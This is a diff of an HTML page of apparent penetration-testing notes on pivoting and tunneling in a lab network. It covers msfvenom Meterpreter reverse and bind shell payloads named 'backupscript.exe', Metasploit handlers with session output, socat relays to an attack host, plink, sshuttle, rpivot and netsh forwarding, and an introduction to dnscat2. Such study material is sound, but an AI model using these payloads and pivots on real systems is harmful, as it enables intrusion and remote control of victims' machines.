+<div class="language-shell-session highlight"><pre><span></span><code><span id="__span-45-1"><a id="__codelineno-45-1" name="__codelineno-45-1" href="#__codelineno-45-1"></a><span class="go">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.182.147.2 -f exe -o backupscript.exe LPORT=1234</span>
 </span></code></pre></div>
 <p>Finally, if we execute our payload on the Windows host, we should be able to receive a shell from Windows pivoted via the Ubuntu server.</p>
-<div class="language-shell-session highlight"><pre><span></span><code><span id="__span-45-1"><a id="__codelineno-45-1" name="__codelineno-45-1" href="#__codelineno-45-1"></a><span class="gp"># </span><span class="c1">#### Establishing the Meterpreter session</span>
-</span><span id="__span-45-2"><a id="__codelineno-45-2" name="__codelineno-45-2" href="#__codelineno-45-2"></a><span class="go">[*] Started reverse TCP handler on 0.0.0.0:8081 </span>
-</span><span id="__span-45-3"><a id="__codelineno-45-3" name="__codelineno-45-3" href="#__codelineno-45-3"></a><span class="go">[*] Sending stage (200262 bytes) to 192.64.166.3</span>
-</span><span id="__span-45-4"><a id="__codelineno-45-4" name="__codelineno-45-4" href="#__codelineno-45-4"></a><span class="go">[*] Meterpreter session 2 opened (192.64.166.3:8081 -&gt; 192.64.166.3:40173 ) at 2022-03-04 15:26:14 -0500</span>
-</span><span id="__span-45-5"><a id="__codelineno-45-5" name="__codelineno-45-5" href="#__codelineno-45-5"></a>
-</span><span id="__span-45-6"><a id="__codelineno-45-6" name="__codelineno-45-6" href="#__codelineno-45-6"></a>
-</span><span id="__span-45-7"><a id="__codelineno-45-7" name="__codelineno-45-7" href="#__codelineno-45-7"></a><span class="go">meterpreter &gt; shell</span>
+<div class="language-shell-session highlight"><pre><span></span><code><span id="__span-46-1"><a id="__codelineno-46-1" name="__codelineno-46-1" href="#__codelineno-46-1"></a><span class="gp"># </span><span class="c1">#### Establishing the Meterpreter session</span>
+</span><span id="__span-46-2"><a id="__codelineno-46-2" name="__codelineno-46-2" href="#__codelineno-46-2"></a><span class="go">[*] Started reverse TCP handler on 0.0.0.0:8081 </span>
+</span><span id="__span-46-3"><a id="__codelineno-46-3" name="__codelineno-46-3" href="#__codelineno-46-3"></a><span class="go">[*] Sending stage (200262 bytes) to 192.64.166.3</span>
+</span><span id="__span-46-4"><a id="__codelineno-46-4" name="__codelineno-46-4" href="#__codelineno-46-4"></a><span class="go">[*] Meterpreter session 2 opened (192.64.166.3:8081 -&gt; 192.64.166.3:40173 ) at 2022-03-04 15:26:14 -0500</span>
+</span><span id="__span-46-5"><a id="__codelineno-46-5" name="__codelineno-46-5" href="#__codelineno-46-5"></a>
+</span><span id="__span-46-6"><a id="__codelineno-46-6" name="__codelineno-46-6" href="#__codelineno-46-6"></a>
+</span><span id="__span-46-7"><a id="__codelineno-46-7" name="__codelineno-46-7" href="#__codelineno-46-7"></a><span class="go">meterpreter &gt; shell</span>
 </span></code></pre></div>
 <h2 id="socat">Socat</h2>
 <h3 id="socat-redirection-with-a-reverse-shell">Socat Redirection with a Reverse Shell</h3>
 <p><a href="https://linux.die.net/man/1/socat">Socat</a> is a bidirectional relay tool that can create pipe sockets between <code>2</code> independent network channels without needing to use SSH tunneling.</p>
 <p>It acts as a redirector that can listen on one host and port and forward that data to another IP address and port.</p>
 <p>Starting Socat Listener in our attacker machine:</p>
-<div class="language-shell-session highlight"><pre><span></span><code><span id="__span-46-1"><a id="__codelineno-46-1" name="__codelineno-46-1" href="#__codelineno-46-1"></a><span class="gp"># </span>Socat<span class="w"> </span>will<span class="w"> </span>listen<span class="w"> </span>on<span class="w"> </span>localhost<span class="w"> </span>on<span class="w"> </span>port<span class="w"> </span><span class="m">8080</span><span class="w"> </span>and<span class="w"> </span>forward<span class="w"> </span>all<span class="w"> </span>the<span class="w"> </span>traffic<span class="w"> </span>to<span class="w"> </span>port<span class="w"> </span><span class="m">80</span><span class="w"> </span>on<span class="w"> </span>our<span class="w"> </span>attack<span class="w"> </span>host<span class="w"> </span><span class="o">(</span><span class="m">192</span>.64.166.3<span class="o">)</span>.
-</span><span id="__span-46-2"><a id="__codelineno-46-2" name="__codelineno-46-2" href="#__codelineno-46-2"></a><span class="go">socat TCP4-LISTEN:8080,fork TCP4:192.64.166.3:80</span>
-</span><span id="__span-46-3"><a id="__codelineno-46-3" name="__codelineno-46-3" href="#__codelineno-46-3"></a><span class="gp"># </span>the<span class="w"> </span>fork<span class="w"> </span>option<span class="w"> </span>tells<span class="w"> </span>socat<span class="w"> </span>to<span class="w"> </span>create<span class="w"> </span>a<span class="w"> </span>new<span class="w"> </span>child<span class="w"> </span>process<span class="w"> </span><span class="k">for</span><span class="w"> </span>each<span class="w"> </span>incoming<span class="w"> </span>connection.
+<div class="language-shell-session highlight"><pre><span></span><code><span id="__span-47-1"><a id="__codelineno-47-1" name="__codelineno-47-1" href="#__codelineno-47-1"></a><span class="gp"># </span>Socat<span class="w"> </span>will<span class="w"> </span>listen<span class="w"> </span>on<span class="w"> </span>localhost<span class="w"> </span>on<span class="w"> </span>port<span class="w"> </span><span class="m">8080</span><span class="w"> </span>and<span class="w"> </span>forward<span class="w"> </span>all<span class="w"> </span>the<span class="w"> </span>traffic<span class="w"> </span>to<span class="w"> </span>port<span class="w"> </span><span class="m">80</span><span class="w"> </span>on<span class="w"> </span>our<span class="w"> </span>attack<span class="w"> </span>host<span class="w"> </span><span class="o">(</span><span class="m">192</span>.64.166.3<span class="o">)</span>.
+</span><span id="__span-47-2"><a id="__codelineno-47-2" name="__codelineno-47-2" href="#__codelineno-47-2"></a><span class="go">socat TCP4-LISTEN:8080,fork TCP4:192.64.166.3:80</span>
+</span><span id="__span-47-3"><a id="__codelineno-47-3" name="__codelineno-47-3" href="#__codelineno-47-3"></a><span class="gp"># </span>the<span class="w"> </span>fork<span class="w"> </span>option<span class="w"> </span>tells<span class="w"> </span>socat<span class="w"> </span>to<span class="w"> </span>create<span class="w"> </span>a<span class="w"> </span>new<span class="w"> </span>child<span class="w"> </span>process<span class="w"> </span><span class="k">for</span><span class="w"> </span>each<span class="w"> </span>incoming<span class="w"> </span>connection.
 </span></code></pre></div>
 <p>Configuring &amp; Starting the multi/handler. Starting a listener on our attacked host:</p>
-<div class="language-shell-session highlight"><pre><span></span><code><span id="__span-47-1"><a id="__codelineno-47-1" name="__codelineno-47-1" href="#__codelineno-47-1"></a><span class="go">sudo msfconsole</span>
-</span><span id="__span-47-2"><a id="__codelineno-47-2" name="__codelineno-47-2" href="#__codelineno-47-2"></a><span class="go">use exploit/multi/handler</span>
-</span><span id="__span-47-3"><a id="__codelineno-47-3" name="__codelineno-47-3" href="#__codelineno-47-3"></a><span class="go">set payload windows/x64/meterpreter/reverse_https</span>
-</span><span id="__span-47-4"><a id="__codelineno-47-4" name="__codelineno-47-4" href="#__codelineno-47-4"></a><span class="go">set lhost 0.0.0.0</span>
-</span><span id="__span-47-5"><a id="__codelineno-47-5" name="__codelineno-47-5" href="#__codelineno-47-5"></a><span class="go">set lport 80</span>
-</span><span id="__span-47-6"><a id="__codelineno-47-6" name="__codelineno-47-6" href="#__codelineno-47-6"></a><span class="go">run</span>
+<div class="language-shell-session highlight"><pre><span></span><code><span id="__span-48-1"><a id="__codelineno-48-1" name="__codelineno-48-1" href="#__codelineno-48-1"></a><span class="go">sudo msfconsole</span>
+</span><span id="__span-48-2"><a id="__codelineno-48-2" name="__codelineno-48-2" href="#__codelineno-48-2"></a><span class="go">use exploit/multi/handler</span>
+</span><span id="__span-48-3"><a id="__codelineno-48-3" name="__codelineno-48-3" href="#__codelineno-48-3"></a><span class="go">set payload windows/x64/meterpreter/reverse_https</span>
+</span><span id="__span-48-4"><a id="__codelineno-48-4" name="__codelineno-48-4" href="#__codelineno-48-4"></a><span class="go">set lhost 0.0.0.0</span>
+</span><span id="__span-48-5"><a id="__codelineno-48-5" name="__codelineno-48-5" href="#__codelineno-48-5"></a><span class="go">set lport 80</span>
+</span><span id="__span-48-6"><a id="__codelineno-48-6" name="__codelineno-48-6" href="#__codelineno-48-6"></a><span class="go">run</span>
 </span></code></pre></div>
 <p>Create a windows payload</p>
-<div class="language-shell-session highlight"><pre><span></span><code><span id="__span-48-1"><a id="__codelineno-48-1" name="__codelineno-48-1" href="#__codelineno-48-1"></a><span class="go">msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.64.147.2 -f exe -o backupscript.exe LPORT=8080</span>
+<div class="language-shell-session highlight"><pre><span></span><code><span id="__span-49-1"><a id="__codelineno-49-1" name="__codelineno-49-1" href="#__codelineno-49-1"></a><span class="go">msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.64.147.2 -f exe -o backupscript.exe LPORT=8080</span>
 </span></code></pre></div>
 <p>Keep in mind that we must transfer this payload to the Windows host (192.182.147.3) and execute it to obtain the reverse shell.</p>
 <h3 id="socat-redirection-with-a-bind-shell">Socat Redirection with a Bind Shell</h3>
@@ -16949,29 +16956,29 @@ Attacked machine 1:
 Attacked machine 2:
     - 192.182.147.3:  A listener in port 8443</p>
 <p><strong>1.</strong> Create a bind shell with the windows payload using msfvenom from our attacker machine:</p>
-<div class="language-shell-session highlight"><pre><span></span><code><span id="__span-49-1"><a id="__codelineno-49-1" name="__codelineno-49-1" href="#__codelineno-49-1"></a><span class="go">msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupscript.exe LPORT=8443</span>
+<div class="language-shell-session highlight"><pre><span></span><code><span id="__span-50-1"><a id="__codelineno-50-1" name="__codelineno-50-1" href="#__codelineno-50-1"></a><span class="go">msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupscript.exe LPORT=8443</span>
 </span></code></pre></div>
 <p><strong>2.</strong> Start a socat bind shell listener, which listens on port 8080 and forwards packets to Windows server 8443. <strong>We do this from the attacked machine 1</strong>.</p>
-<div class="language-shell-session highlight"><pre><span></span><code><span id="__span-50-1"><a id="__codelineno-50-1" name="__codelineno-50-1" href="#__codelineno-50-1"></a><span class="go">socat TCP4-LISTEN:8080,fork TCP4:192.182.147.3:8443</span>
+<div class="language-shell-session highlight"><pre><span></span><code><span id="__span-51-1"><a id="__codelineno-51-1" name="__codelineno-51-1" href="#__codelineno-51-1"></a><span class="go">socat TCP4-LISTEN:8080,fork TCP4:192.182.147.3:8443</span>
 </span></code></pre></div>
 <p><strong>3.</strong> Configuring &amp; Starting the Bind multi/handler. <strong>We do this from the attacked machine 1</strong>.</p>
-<div class="language-shell-session highlight"><pre><span></span><code><span id="__span-51-1"><a id="__codelineno-51-1" name="__codelineno-51-1" href="#__codelineno-51-1"></a><span class="go">msfconsole -q</span>
-</span><span id="__span-51-2"><a id="__codelineno-51-2" name="__codelineno-51-2" href="#__codelineno-51-2"></a>
-</span><span id="__span-51-3"><a id="__codelineno-51-3" name="__codelineno-51-3" href="#__codelineno-51-3"></a><span class="go">use exploit/multi/handler</span>
-</span><span id="__span-51-4"><a id="__codelineno-51-4" name="__codelineno-51-4" href="#__codelineno-51-4"></a><span class="go">set RHOST 192.64.166.2</span>
-</span><span id="__span-51-5"><a id="__codelineno-51-5" name="__codelineno-51-5" href="#__codelineno-51-5"></a><span class="go">set LPORT 8080</span>
-</span><span id="__span-51-6"><a id="__codelineno-51-6" name="__codelineno-51-6" href="#__codelineno-51-6"></a><span class="go">run</span>
-</span><span id="__span-51-7"><a id="__codelineno-51-7" name="__codelineno-51-7" href="#__codelineno-51-7"></a>
-</span><span id="__span-51-8"><a id="__codelineno-51-8" name="__codelineno-51-8" href="#__codelineno-51-8"></a>
-</span><span id="__span-51-9"><a id="__codelineno-51-9" name="__codelineno-51-9" href="#__codelineno-51-9"></a><span class="go">[*] Started bind TCP handler against 192.64.166.2:8080</span>
-</span><span id="__span-51-10"><a id="__codelineno-51-10" name="__codelineno-51-10" href="#__codelineno-51-10"></a><span class="go">...</span>
-</span><span id="__span-51-11"><a id="__codelineno-51-11" name="__codelineno-51-11" href="#__codelineno-51-11"></a><span class="go">...</span>
-</span><span id="__span-51-12"><a id="__codelineno-51-12" name="__codelineno-51-12" href="#__codelineno-51-12"></a><span class="gp"># </span>Establishing<span class="w"> </span>Meterpreter<span class="w"> </span>Session
-</span><span id="__span-51-13"><a id="__codelineno-51-13" name="__codelineno-51-13" href="#__codelineno-51-13"></a><span class="go">[*] Sending stage (200262 bytes) to 192.64.166.2</span>
-</span><span id="__span-51-14"><a id="__codelineno-51-14" name="__codelineno-51-14" href="#__codelineno-51-14"></a><span class="go">[*] Meterpreter session 1 opened (192.64.166.3:46253 -&gt; 192.64.166.2:8080 ) at 2022-03-07 12:44:44 -0500</span>
-</span><span id="__span-51-15"><a id="__codelineno-51-15" name="__codelineno-51-15" href="#__codelineno-51-15"></a>
-</span><span id="__span-51-16"><a id="__codelineno-51-16" name="__codelineno-51-16" href="#__codelineno-51-16"></a><span class="go">meterpreter &gt; getuid</span>
-</span><span id="__span-51-17"><a id="__codelineno-51-17" name="__codelineno-51-17" href="#__codelineno-51-17"></a><span class="go">Server username: INLANEFREIGHT\victor</span>
+<div class="language-shell-session highlight"><pre><span></span><code><span id="__span-52-1"><a id="__codelineno-52-1" name="__codelineno-52-1" href="#__codelineno-52-1"></a><span class="go">msfconsole -q</span>
+</span><span id="__span-52-2"><a id="__codelineno-52-2" name="__codelineno-52-2" href="#__codelineno-52-2"></a>
+</span><span id="__span-52-3"><a id="__codelineno-52-3" name="__codelineno-52-3" href="#__codelineno-52-3"></a><span class="go">use exploit/multi/handler</span>
+</span><span id="__span-52-4"><a id="__codelineno-52-4" name="__codelineno-52-4" href="#__codelineno-52-4"></a><span class="go">set RHOST 192.64.166.2</span>
+</span><span id="__span-52-5"><a id="__codelineno-52-5" name="__codelineno-52-5" href="#__codelineno-52-5"></a><span class="go">set LPORT 8080</span>
+</span><span id="__span-52-6"><a id="__codelineno-52-6" name="__codelineno-52-6" href="#__codelineno-52-6"></a><span class="go">run</span>
+</span><span id="__span-52-7"><a id="__codelineno-52-7" name="__codelineno-52-7" href="#__codelineno-52-7"></a>
+</span><span id="__span-52-8"><a id="__codelineno-52-8" name="__codelineno-52-8" href="#__codelineno-52-8"></a>
+</span><span id="__span-52-9"><a id="__codelineno-52-9" name="__codelineno-52-9" href="#__codelineno-52-9"></a><span class="go">[*] Started bind TCP handler against 192.64.166.2:8080</span>
+</span><span id="__span-52-10"><a id="__codelineno-52-10" name="__codelineno-52-10" href="#__codelineno-52-10"></a><span class="go">...</span>
+</span><span id="__span-52-11"><a id="__codelineno-52-11" name="__codelineno-52-11" href="#__codelineno-52-11"></a><span class="go">...</span>
+</span><span id="__span-52-12"><a id="__codelineno-52-12" name="__codelineno-52-12" href="#__codelineno-52-12"></a><span class="gp"># </span>Establishing<span class="w"> </span>Meterpreter<span class="w"> </span>Session
+</span><span id="__span-52-13"><a id="__codelineno-52-13" name="__codelineno-52-13" href="#__codelineno-52-13"></a><span class="go">[*] Sending stage (200262 bytes) to 192.64.166.2</span>
+</span><span id="__span-52-14"><a id="__codelineno-52-14" name="__codelineno-52-14" href="#__codelineno-52-14"></a><span class="go">[*] Meterpreter session 1 opened (192.64.166.3:46253 -&gt; 192.64.166.2:8080 ) at 2022-03-07 12:44:44 -0500</span>
+</span><span id="__span-52-15"><a id="__codelineno-52-15" name="__codelineno-52-15" href="#__codelineno-52-15"></a>
+</span><span id="__span-52-16"><a id="__codelineno-52-16" name="__codelineno-52-16" href="#__codelineno-52-16"></a><span class="go">meterpreter &gt; getuid</span>
+</span><span id="__span-52-17"><a id="__codelineno-52-17" name="__codelineno-52-17" href="#__codelineno-52-17"></a><span class="go">Server username: INLANEFREIGHT\victor</span>
 </span></code></pre></div>
 <h2 id="ssh-for-windows-plinkexe">SSH for Windows: plink.exe</h2>
 <p>Plink, short for PuTTY Link, is a Windows command-line SSH tool that comes as a part of the PuTTY package when installed. Similar to SSH, Plink can also be used to create dynamic port forwards and SOCKS proxies</p>
@@ -16999,7 +17006,7 @@ Attacked machine 2:
 </tr>
 </tbody>
 </table>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-52-1"><a id="__codelineno-52-1" name="__codelineno-52-1" href="#__codelineno-52-1"></a>plink -ssh -D 9050 ubuntu@10.10.10.3
+<div class="language-text highlight"><pre><span></span><code><span id="__span-53-1"><a id="__codelineno-53-1" name="__codelineno-53-1" href="#__codelineno-53-1"></a>plink -ssh -D 9050 ubuntu@10.10.10.3
 </span></code></pre></div>
 <p>Another Windows-based tool called <a href="https://www.proxifier.com/">Proxifier</a> can be used to start a SOCKS tunnel via the SSH session we created. Proxifier is a Windows tool that creates a tunneled network for desktop client applications and allows it to operate through a SOCKS or HTTPS proxy and allows for proxy chaining. It is possible to create a profile where we can provide the configuration for our SOCKS server started by Plink on port 9050.</p>
 <p>After configuring the SOCKS server for <code>127.0.0.1</code> and port 9050, we can directly start <code>mstsc.exe</code> to start an RDP session with a Windows target that allows RDP connections.</p>
@@ -17031,14 +17038,14 @@ Attacked machine 2:
 <p>Sshuttle is another tool written in Python which removes the need to configure proxychains. However, this tool only works for pivoting over SSH and does not provide other options for pivoting over TOR or HTTPS proxy servers.</p>
 <p><code>Sshuttle</code> can be extremely useful for automating the execution of iptables and adding pivot rules for the remote host. We can configure the Ubuntu server as a pivot point and route all of Nmap's network traffic with sshuttle:</p>
 <p><strong>1.</strong> Installing sshuttle</p>
-<div class="language-shell-session highlight"><pre><span></span><code><span id="__span-53-1"><a id="__codelineno-53-1" name="__codelineno-53-1" href="#__codelineno-53-1"></a><span class="go">sudo apt-get install sshuttle</span>
+<div class="language-shell-session highlight"><pre><span></span><code><span id="__span-54-1"><a id="__codelineno-54-1" name="__codelineno-54-1" href="#__codelineno-54-1"></a><span class="go">sudo apt-get install sshuttle</span>
 </span></code></pre></div>
 <p><strong>2.</strong> Running sshuttle</p>
-<div class="language-shell-session highlight"><pre><span></span><code><span id="__span-54-1"><a id="__codelineno-54-1" name="__codelineno-54-1" href="#__codelineno-54-1"></a><span class="go">sudo sshuttle -r ubuntu@10.10.10.3 10.10.20.0/24 -v </span>
-</span><span id="__span-54-2"><a id="__codelineno-54-2" name="__codelineno-54-2" href="#__codelineno-54-2"></a><span class="gp"># </span>With<span class="w"> </span>this<span class="w"> </span>command,<span class="w"> </span>sshuttle<span class="w"> </span>creates<span class="w"> </span>an<span class="w"> </span>entry<span class="w"> </span><span class="k">in</span><span class="w"> </span>our<span class="w"> </span>iptables<span class="w"> </span>to<span class="w"> </span>redirect<span class="w"> </span>all<span class="w"> </span>traffic<span class="w"> </span>to<span class="w"> </span>the<span class="w"> </span><span class="m">172</span>.16.5.0/23<span class="w"> </span>network<span class="w"> </span>through<span class="w"> </span>the<span class="w"> </span>pivot<span class="w"> </span>host.
+<div class="language-shell-session highlight"><pre><span></span><code><span id="__span-55-1"><a id="__codelineno-55-1" name="__codelineno-55-1" href="#__codelineno-55-1"></a><span class="go">sudo sshuttle -r ubuntu@10.10.10.3 10.10.20.0/24 -v </span>
+</span><span id="__span-55-2"><a id="__codelineno-55-2" name="__codelineno-55-2" href="#__codelineno-55-2"></a><span class="gp"># </span>With<span class="w"> </span>this<span class="w"> </span>command,<span class="w"> </span>sshuttle<span class="w"> </span>creates<span class="w"> </span>an<span class="w"> </span>entry<span class="w"> </span><span class="k">in</span><span class="w"> </span>our<span class="w"> </span>iptables<span class="w"> </span>to<span class="w"> </span>redirect<span class="w"> </span>all<span class="w"> </span>traffic<span class="w"> </span>to<span class="w"> </span>the<span class="w"> </span><span class="m">172</span>.16.5.0/23<span class="w"> </span>network<span class="w"> </span>through<span class="w"> </span>the<span class="w"> </span>pivot<span class="w"> </span>host.
 </span></code></pre></div>
 <p><strong>3.</strong> We can now use any tool directly without using proxychains.</p>
-<div class="language-shell-session highlight"><pre><span></span><code><span id="__span-55-1"><a id="__codelineno-55-1" name="__codelineno-55-1" href="#__codelineno-55-1"></a><span class="go">nmap -v -sV -p3389 10.10.20.3 -A -Pn</span>
+<div class="language-shell-session highlight"><pre><span></span><code><span id="__span-56-1"><a id="__codelineno-56-1" name="__codelineno-56-1" href="#__codelineno-56-1"></a><span class="go">nmap -v -sV -p3389 10.10.20.3 -A -Pn</span>
 </span></code></pre></div>
 <h2 id="web-server-pivoting-with-rpivot">Web Server Pivoting with Rpivot</h2>
 <h3 id="pivoting-to-access-a-web-server-on-an-internal-network">Pivoting to access a web server on an internal network</h3>
@@ -17076,35 +17083,35 @@ Attacked machine 2:
 <p>And an External Network at 10.10.40.0</p>
 <p>We will take the scenario above, where we have a web server on our internal network (<code>172.10.20.135</code>), and we want to access that using the rpivot proxy.</p>
 <p><strong>1.</strong> Install rpivot in kali attacker machine:</p>
-<div class="language-shell-session highlight"><pre><span></span><code><span id="__span-56-1"><a id="__codelineno-56-1" name="__codelineno-56-1" href="#__codelineno-56-1"></a><span class="go">git clone https://github.com/klsecservices/rpivot.git</span>
+<div class="language-shell-session highlight"><pre><span></span><code><span id="__span-57-1"><a id="__codelineno-57-1" name="__codelineno-57-1" href="#__codelineno-57-1"></a><span class="go">git clone https://github.com/klsecservices/rpivot.git</span>
 </span></code></pre></div>
 <p><strong>2.</strong> Run server.py  with python2.7 from the kali attacker machine:</p>
-<div class="language-shell-session highlight"><pre><span></span><code><span id="__span-57-1"><a id="__codelineno-57-1" name="__codelineno-57-1" href="#__codelineno-57-1"></a><span class="go">cd rpivot</span>
-</span><span id="__span-57-2"><a id="__codelineno-57-2" name="__codelineno-57-2" href="#__codelineno-57-2"></a>
-</span><span id="__span-57-3"><a id="__codelineno-57-3" name="__codelineno-57-3" href="#__codelineno-57-3"></a><span class="go">python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0</span>
+<div class="language-shell-session highlight"><pre><span></span><code><span id="__span-58-1"><a id="__codelineno-58-1" name="__codelineno-58-1" href="#__codelineno-58-1"></a><span class="go">cd rpivot</span>
+</span><span id="__span-58-2"><a id="__codelineno-58-2" name="__codelineno-58-2" href="#__codelineno-58-2"></a>
+</span><span id="__span-58-3"><a id="__codelineno-58-3" name="__codelineno-58-3" href="#__codelineno-58-3"></a><span class="go">python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0</span>
 </span></code></pre></div>
 <p><strong>3.</strong> Transfer rpivot folder to the target, the attacked machine 1: ubuntu.</p>
-<div class="language-shell-session highlight"><pre><span></span><code><span id="__span-58-1"><a id="__codelineno-58-1" name="__codelineno-58-1" href="#__codelineno-58-1"></a><span class="go">scp -r rpivot ubuntu@10.10.50.2:/home/ubuntu/</span>
+<div class="language-shell-session highlight"><pre><span></span><code><span id="__span-59-1"><a id="__codelineno-59-1" name="__codelineno-59-1" href="#__codelineno-59-1"></a><span class="go">scp -r rpivot ubuntu@10.10.50.2:/home/ubuntu/</span>
 </span></code></pre></div>
 <p><strong>4.</strong> Run client.py from the pivot target (attacked machine 1: ubuntu):</p>
-<div class="language-shell-session highlight"><pre><span></span><code><span id="__span-59-1"><a id="__codelineno-59-1" name="__codelineno-59-1" href="#__codelineno-59-1"></a><span class="go">~/rpivot$ python2.7 client.py --server-ip 10.10.10.2 --server-port 9999</span>
-</span><span id="__span-59-2"><a id="__codelineno-59-2" name="__codelineno-59-2" href="#__codelineno-59-2"></a>
-</span><span id="__span-59-3"><a id="__codelineno-59-3" name="__codelineno-59-3" href="#__codelineno-59-3"></a><span class="gp"># </span>We<span class="w"> </span>will<span class="w"> </span>see<span class="w"> </span>a<span class="w"> </span>connection
-</span><span id="__span-59-4"><a id="__codelineno-59-4" name="__codelineno-59-4" href="#__codelineno-59-4"></a><span class="go">New connection from host 10.10.50.2, source port 35226</span>
+<div class="language-shell-session highlight"><pre><span></span><code><span id="__span-60-1"><a id="__codelineno-60-1" name="__codelineno-60-1" href="#__codelineno-60-1"></a><span class="go">~/rpivot$ python2.7 client.py --server-ip 10.10.10.2 --server-port 9999</span>
+</span><span id="__span-60-2"><a id="__codelineno-60-2" name="__codelineno-60-2" href="#__codelineno-60-2"></a>
+</span><span id="__span-60-3"><a id="__codelineno-60-3" name="__codelineno-60-3" href="#__codelineno-60-3"></a><span class="gp"># </span>We<span class="w"> </span>will<span class="w"> </span>see<span class="w"> </span>a<span class="w"> </span>connection
+</span><span id="__span-60-4"><a id="__codelineno-60-4" name="__codelineno-60-4" href="#__codelineno-60-4"></a><span class="go">New connection from host 10.10.50.2, source port 35226</span>
 </span></code></pre></div>
 <p><strong>5.</strong> Configure proxychains to pivot over our local server on 127.0.0.1:9050 on our attacker machine, which was initially started by the Python server.</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-60-1"><a id="__codelineno-60-1" name="__codelineno-60-1" href="#__codelineno-60-1"></a>sudo nano /etc/proxychains4.conf
-</span><span id="__span-60-2"><a id="__codelineno-60-2" name="__codelineno-60-2" href="#__codelineno-60-2"></a># Adding `socks5 127.0.0.1 9050` in the last line
+<div class="language-text highlight"><pre><span></span><code><span id="__span-61-1"><a id="__codelineno-61-1" name="__codelineno-61-1" href="#__codelineno-61-1"></a>sudo nano /etc/proxychains4.conf
+</span><span id="__span-61-2"><a id="__codelineno-61-2" name="__codelineno-61-2" href="#__codelineno-61-2"></a># Adding `socks5 127.0.0.1 9050` in the last line
 </span></code></pre></div>
 <p><strong>6.</strong> Finally, we should be able to access the webserver on our server-side, which is hosted on the internal network of 172.16.5.0/23 at 172.16.5.135:80 using proxychains and Firefox.</p>
-<div class="language-shell-session highlight"><pre><span></span><code><span id="__span-61-1"><a id="__codelineno-61-1" name="__codelineno-61-1" href="#__codelineno-61-1"></a><span class="go">proxychains firefox-esr 172.10.20.135:80</span>
+<div class="language-shell-session highlight"><pre><span></span><code><span id="__span-62-1"><a id="__codelineno-62-1" name="__codelineno-62-1" href="#__codelineno-62-1"></a><span class="go">proxychains firefox-esr 172.10.20.135:80</span>
 </span></code></pre></div>
 <h3 id="pivoting-to-access-an-external-server-attack-host-on-the-cloud">Pivoting to access an external server (attack host) on the cloud</h3>
 <p>here could be scenarios when we cannot directly pivot to an external server (attack host) on the cloud. Some organizations have <a href="https://docs.microsoft.com/en-us/openspecs/office_protocols/ms-grvhenc/b9e676e7-e787-4020-9840-7cfe7c76044a">HTTP-proxy with NTLM authentication</a> configured with the Domain Controller. In such cases, we can provide an additional NTLM authentication option to rpivot to authenticate via the NTLM proxy by providing a username and password. In these cases, we could use rpivot's client.py in the following way.</p>
 <p>Client NTLM authentication example</p>
 <p><img alt="NTLM authentication" src="../img/ntlm.png" /></p>
 <p><strong>1.</strong> Connect to a Web Server using HTTP-Proxy &amp; NTLM Auth</p>
-<div class="language-shell-session highlight"><pre><span></span><code><span id="__span-62-1"><a id="__codelineno-62-1" name="__codelineno-62-1" href="#__codelineno-62-1"></a><span class="go">python client.py --server-ip &lt;IPaddressofTargetWebServer&gt; --server-port 8080 --ntlm-proxy-ip &lt;IPaddressofProxy&gt; --ntlm-proxy-port 8081 --domain &lt;nameofWindowsDomain&gt; --username &lt;username&gt; --password &lt;password&gt;</span>
+<div class="language-shell-session highlight"><pre><span></span><code><span id="__span-63-1"><a id="__codelineno-63-1" name="__codelineno-63-1" href="#__codelineno-63-1"></a><span class="go">python client.py --server-ip &lt;IPaddressofTargetWebServer&gt; --server-port 8080 --ntlm-proxy-ip &lt;IPaddressofProxy&gt; --ntlm-proxy-port 8081 --domain &lt;nameofWindowsDomain&gt; --username &lt;username&gt; --password &lt;password&gt;</span>
 </span></code></pre></div>
 <h2 id="port-forwarding-with-windows-netsh">Port Forwarding with Windows Netsh</h2>
 <p><a href="https://docs.microsoft.com/en-us/windows-server/networking/technologies/netsh/netsh-contexts">Netsh</a> is a Windows command-line tool that can help with the network configuration of a particular Windows system. Here are just some of the networking related tasks we can use <code>Netsh</code> for:</p>
@@ -17116,10 +17123,10 @@ Attacked machine 2:
 </ul>
 <p>We can use <code>netsh.exe</code> to forward all data received on a specific port (say 8080) to a remote host on a remote port. </p>
 <p>This can be performed entering in the Windows machine (Windows-based pivot host) and using the below command.</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-63-1"><a id="__codelineno-63-1" name="__codelineno-63-1" href="#__codelineno-63-1"></a>netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=$IpInterface1 connectport=3389 connectaddress=$IpInterface2
+<div class="language-text highlight"><pre><span></span><code><span id="__span-64-1"><a id="__codelineno-64-1" name="__codelineno-64-1" href="#__codelineno-64-1"></a>netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=$IpInterface1 connectport=3389 connectaddress=$IpInterface2
 </span></code></pre></div>
 <p>Now we can connect to the 8080 port of the Windows machine (Windows-based pivot host) from our kali attacking machine using xfreerdp:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-64-1"><a id="__codelineno-64-1" name="__codelineno-64-1" href="#__codelineno-64-1"></a>xfreerdp /v:$IpInterface1:8080 /u:$username /p:$password
+<div class="language-text highlight"><pre><span></span><code><span id="__span-65-1"><a id="__codelineno-65-1" name="__codelineno-65-1" href="#__codelineno-65-1"></a>xfreerdp /v:$IpInterface1:8080 /u:$username /p:$password
 </span></code></pre></div>
 <h2 id="tunneling">Tunneling</h2>
 <h3 id="dns-tunneling-with-dnscat2">DNS tunneling with Dnscat2</h3>
@@ -17136,41 +17143,41 @@ Attacked machine 2:
 <p>dnscat2 strives to be different from other DNS tunneling protocols by being designed for a special purpose: command and control. It can tunnel any data, with no protocol attached. Which means it can upload and download files, it can run a shell, and it can do those things well. It can also potentially tunnel TCP, but that's only going to be added in the context of a pen-testing tool (that is, tunneling TCP into a network), not as a general purpose tunneling tool.</p>
 </blockquote>
 <p><strong>1.</strong> Install it in the attacker machine kali:</p>
